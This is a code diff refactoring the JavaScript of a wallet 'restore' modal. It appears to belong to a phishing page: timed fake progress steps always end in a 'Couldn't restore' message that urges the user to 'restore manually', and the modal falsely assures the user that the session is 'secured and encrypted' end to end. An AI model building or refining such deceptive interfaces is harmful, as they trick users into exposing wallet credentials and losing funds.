@@ -70,36 +70,41 @@ document.addEventListener("DOMContentLoaded", () => {
       ];
       let currentStep = 0;
 
-      function nextStep() {
+      // Render base layout once
+      modalContent.innerHTML = `
+        <p class="flex flex-col justify-center items-center space-y-1">
+          <img src="${icon.img}" alt="" class="mx-auto w-12" />
+          <span class="font-bold">${icon.name}</span>
+        </p>
+        <p class="text-gray-500 text-center text-sm">
+          This session is secured and encrypted
+        </p>
+        <div class="flex flex-col w-10/12 justify-center items-center space-y-3 bg-white py-3 rounded-b-xl" id="error-b-c">
+          <div class="py-4 relative w-52">
+            <div class="progress-container bg-violet-900 rounded-lg w-full"></div>
+            <div class="progress rounded-full bg-violet-900"></div>
+          </div>
+          <p class="flex flex-col justify-center items-center space-y-1">
+            <span id="step-text" class="font-bold text-center text-sm"></span>
+            <span class="font-medium italic text-xs text-center">..please wait..</span>
+          </p>
+        </div>
+        
+        <p class="flex flex-row justify-center items-center space-x-2 w-8/12 mx-auto">
+          <img src="${shieldIcon}" alt="" class="w-7" />
+          <span class="text-gray-600 font-medium text-wrap text-xs">
+            This session is protected with an end-to-end encryption
+          </span>
+        </p>
+      `;
+
+      const stepTextElement = document.getElementById("step-text");
+
+      function updateStep() {
         if (currentStep < steps.length) {
-          modalContent.innerHTML = `
-            <p class="flex flex-col justify-center items-center space-y-1">
-              <img src="${icon.img}" alt="" class="mx-auto w-12" />
-              <span class="font-bold">${icon.name}</span>
-            </p>
-            <p class="text-gray-500 text-center text-sm">
-              This session is secured and encrypted
-            </p>
-            <div class="flex flex-col w-10/12 justify-center items-center space-y-3 bg-white py-3 rounded-b-xl" id="error-b-c">
-              <div class="py-4 relative w-52">
-                <div class="progress-container bg-violet-900 rounded-lg w-full"></div>
-                <div class="progress rounded-full bg-violet-900"></div>
-              </div>
-              <p class="flex flex-col justify-center items-center space-y-1">
-                <span class="font-bold text-center text-sm">${steps[currentStep].toLowerCase()}</span>
-                <span class="font-medium italic text-xs text-center">..please wait..</span>
-              </p>
-            </div>
-            
-            <p class="flex flex-row justify-center items-center space-x-2 w-8/12 mx-auto">
-              <img src="${shieldIcon}" alt="" class="w-7" />
-              <span class="text-gray-600 font-medium text-wrap text-xs">
-                This session is protected with an end-to-end encryption
-              </span>
-            </p>
-          `;
+          stepTextElement.textContent = steps[currentStep].toLowerCase();
           currentStep++;
-          setTimeout(nextStep, 1500);
+          setTimeout(updateStep, 1500);
         } else {
           showFailure();
         }
@@ -111,8 +116,7 @@ document.addEventListener("DOMContentLoaded", () => {
             <img src="${icon.img}" alt="" class="mx-auto" />
             <span class="font-bold">${icon.name}</span>
           </p>
-          <div class="flex flex-col w-11/12 justify-center items-center  bg-white pb-10 rounded-xl -mt-5">
-            
+          <div class="flex flex-col w-11/12 justify-center items-center bg-white pb-10 rounded-xl -mt-5">
             <p class="text-red-600 font-bold text-lg leading-tight">Couldn't restore</p>
             <p class="text-gray-500 text-center text-sm px-4">
               We encountered an issue while trying to restore your wallet. Please try again or restore manually.
@@ -137,7 +141,7 @@ document.addEventListener("DOMContentLoaded", () => {
         });
       }
 
-      nextStep();
+      updateStep();
     }
 
     showSequence();
